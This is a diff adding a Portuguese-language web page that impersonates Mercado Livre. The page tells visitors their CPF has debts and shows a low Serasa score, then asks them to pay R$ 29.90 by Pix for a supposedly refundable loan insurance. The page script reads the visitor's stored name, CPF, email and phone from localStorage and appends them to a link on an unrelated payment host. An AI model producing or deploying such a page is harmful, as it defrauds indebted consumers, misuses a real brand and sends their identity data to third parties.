@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/up2/css/all.min.css">
+    <title>Mercado Livre</title>
+    
+    <script src="/up2/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17359210869"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17359210869');
+</script>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #a216ff;
+            background-color: #7E08CA;
+        }
+        .logo {
+            width: 80px;
+            padding: 10px;
+            margin-left: 20px;
+        }
+        .content {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .score-container {
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .score-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+        .score-bar {
+            display: flex;
+            margin: 10px 0;
+        }
+        .bar-segment {
+            height: 8px;
+            border-radius: 4px;
+            margin-right: 2px;
+        }
+        .bar-red {
+            background-color: #ff1a1a;
+            width: 20%;
+        }
+        .bar-yellow {
+            background-color: #ffcc00;
+            width: 30%;
+        }
+        .bar-green {
+            background-color: #00cc00;
+            width: 50%;
+        }
+        .credit-info {
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .payment-button {
+            background-color: #00c42a;
+            color: white;
+            padding: 12px;
+            border-radius: 6px;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="/up2/images/logo.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+        <div class="alert" style="background: #f2f2f2; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+            <div style="padding: 10px;">
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <i class="fas fa-exclamation-circle" style="color: #f04449; font-size: 20px; margin-right: 10px;"></i>
+                    <h3 style="color: #f04449; margin: 0; font-size: 14px;">Um problema necessita da sua atenção!</h3>
+                </div>
+                <p style="color: #666; font-size: 14px; margin: 0 0 20px 0; line-height: 1.4;">
+                    Após uma tentativa de aprovação do seu empréstimo, constatamos que o seu CPF possui débitos pendentes junto ao SPC/Serasa. Mas não se preocupe, nós estamos aqui para ajudar você a contornar essa situação.
+                </p>
+            </div>
+
+
+            <div class="serasa-score" style="background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <h3 style="font-size: 16px; margin: 0 0 5px 0;">Serasa Score</h3>
+                <p style="color: #666; font-size: 14px; margin: 0 0 15px 0;">Entenda seu momento financeiro</p>
+                
+                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                    <div style="font-size: 32px; font-weight: bold;">221</div>
+                    <div style="background: #ffebeb; color: #f04449; padding: 4px 8px; border-radius: 4px; font-size: 14px;">baixo</div>
+                </div>
+                
+                <div style="width: 100%; height: 8px; background: #e5e5e5; border-radius: 4px; margin-bottom: 5px;">
+                    <div style="width: 22.1%; height: 100%; background: #f04449; border-radius: 4px;"></div>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; color: #999; font-size: 12px; margin-bottom: 20px;">
+                    <span>0</span>
+                    <span>500</span>
+                    <span>1000</span>
+                </div>
+
+                <div class="score-ranges" style="background: #f8f8f8; padding: 15px; border-radius: 8px;">
+                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                        <i class="fas fa-circle" style="color: #f04449; font-size: 12px; margin-right: 10px;"></i>
+                        <div>
+                            <div style="font-size: 14px; color: #f04449; font-weight: bold;">Score de 0 a 250</div>
+                            <div style="color: #666; font-size: 12px;">Risco alto de atrasar pagamentos</div>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                        <i class="fas fa-circle" style="color: #ffd700; font-size: 12px; margin-right: 10px;"></i>
+                        <div>
+                            <div style="font-size: 14px; color: #ffd700; font-weight: bold;">Score de 251 a 500</div>
+                            <div style="color: #666; font-size: 12px;">Probabilidade moderada de atrasos</div>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                        <i class="fas fa-circle" style="color: #65aa65; font-size: 12px; margin-right: 10px;"></i>
+                        <div>
+                            <div style="font-size: 14px; color: #65aa65; font-weight: bold;">Score de 501 a 750</div>
+                            <div style="color: #666; font-size: 12px;">Risco baixo de inadimplência</div>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; align-items: center;">
+                        <i class="fas fa-circle" style="color: #00c42a; font-size: 12px; margin-right: 10px;"></i>
+                        <div>
+                            <div style="font-size: 14px; color: #00c42a; font-weight: bold;">Score de 751 a 1000</div>
+                            <div style="color: #666; font-size: 12px;">Excelente histórico de pagamentos</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+              <h3>O que é a Tarifa de Cadastro?</h3>
+        <p>Aumente o volume 🔈</p>
+
+     <script src="/up2/js/player.js"></script>
+<script type="module" src="/up2/js/e6blhqkox8.js"></script>
+<style>wistia-player[media-id='e6blhqkox8']:not(:defined){background:center/contain no-repeat url('https://fast.wistia.com/embed/medias/e6blhqkox8/swatch');display:block;filter:blur(5px);padding-top:55.94%;}</style>
+<wistia-player media-id="e6blhqkox8" aspect="1.7877094972067038"></wistia-player>
+     
+        <!--Inicio timeline-->
+        <div class="loan-status-timeline">
+            <div class="bar"></div>
+            
+            <div class="info-box" style="background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-top: 30px;">
+                <h2 style="font-size: 16px; color: #333; margin-bottom: 15px;">Por que devo contratar o Seguro Prestamista?</h2>
+                
+                <p style="color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
+                    Quando uma pessoa é negativada, significa que ela possui um histórico de dívidas não pagas, o que a coloca em uma categoria de alto risco para a instituição financeira.
+                </p>
+
+                <p style="color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
+                    Por isso existe o Seguro Prestamista, este seguro atua como uma proteção financeira para empresas concedentes de empréstimo e para o cliente segurado.
+                </p>
+
+                <p style="color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
+                    O Seguro Prestamista garante a quitação total ou parcial das parcelas do empréstimo, caso o segurado enfrente falecimento, acidente, desemprego involuntário ou doença grave que o torne total ou temporariamente incapaz de trabalhar, respeitados os períodos de carência e franquia.
+                </p>
+
+                <p style="color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
+                    Se o seguro não precisar ser acionado, o valor será integralmente reembolsado ao segurado ao final do contrato de empréstimo.
+                </p>
+
+                <p style="color: #656565; font-size: 14px; font-weight: bold;">
+                    Veja a importância do Seguro Prestamista
+                </p>
+            </div>
+
+            <div class="info-box" style="background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-top: 30px; text-align: center;">
+                <h2 style="font-size: 18px; color: #333; margin-bottom: 5px; text-align: center;">Contrate o seguro <i class="fa-brands fa-pix" style="color: #00c42a;"></i></h2>
+                <p style="color: #666; font-size: 12.5px; margin-bottom: 15px; text-align: center;">O pagamento será confirmado imediatamente</p>
+                <div style="font-size: 28px; font-weight: bold; color: #00c42a; margin-bottom: 15px; text-align: center;">R$ 29,90</div>
+                <button onclick="redirectToPayment()" style="background-color: #7E08CA; font-weight: bold; color: #fff; font-size: 16px; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 90%; margin: 0 auto; display: block;">Pagar agora</button>
+                <div style="margin-top: 10px; color: #28a745; font-size: 14px; text-align: center;">
+                    <i class="fas fa-shield-alt" style="margin-right: 5px;"></i>Ambiente seguro
+                </div>
+            </div>
+        </div>
+
+        <script>
+            function getUrlParams() {
+                const params = {};
+                const queryString = window.location.search;
+                const urlParams = new URLSearchParams(queryString);
+                
+                // Primeiro tenta pegar os parâmetros da URL atual
+                for (const [key, value] of urlParams) {
+                    params[key] = value;
+                }
+
+                // Se não houver parâmetros na URL, tenta recuperar do localStorage
+                if (Object.keys(params).length === 0) {
+                    const savedParams = localStorage.getItem('urlParams');
+                    if (savedParams) {
+                        return JSON.parse(savedParams);
+                    }
+                }
+
+                return params;
+            }
+
+            function getUTMParams() {
+                return getUrlParams();
+            }
+
+            function buildUrlWithParams(baseUrl) {
+                const params = getUrlParams();
+                const url = new URL(baseUrl, window.location.href);
+                Object.keys(params).forEach(key => {
+                    url.searchParams.append(key, params[key]);
+                });
+                
+                return url.toString();
+            }
+
+            function redirectToPaymentLegacy() {
+                try {
+                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                    const email = localStorage.getItem('email') || '';
+                    const telephone = localStorage.getItem('telephone') || '';
+                    
+                    const baseUrl = 'https://pay.clubevantagem.site/yOeXZKxQXKqGAQa';
+                    const url = new URL(baseUrl);
+                    
+                    // Adicionar parâmetros do usuário
+                    url.searchParams.append('name', dadosUsuario.NOME || '');
+                    url.searchParams.append('document', dadosUsuario.CPF || '');
+                    url.searchParams.append('email', email);
+                    url.searchParams.append('telephone', telephone);
+                    
+                    // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
+                    const finalUrl = buildUrlWithParams(url.toString());
+                    
+                    const button = document.querySelector('button');
+                    button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
+                    
+                    window.location.href = finalUrl;
+                } catch(err) {
+                    console.error('Erro ao redirecionar:', err);
+                    window.location.href = buildUrlWithParams('https://pay.clubevantagem.site/yOeXZKxQXKqGAQa');
+                }
+            }
+        </script>
+
+    
+
+
+  <script src="/js/checkout-nu.js"></script>
+</body></html>
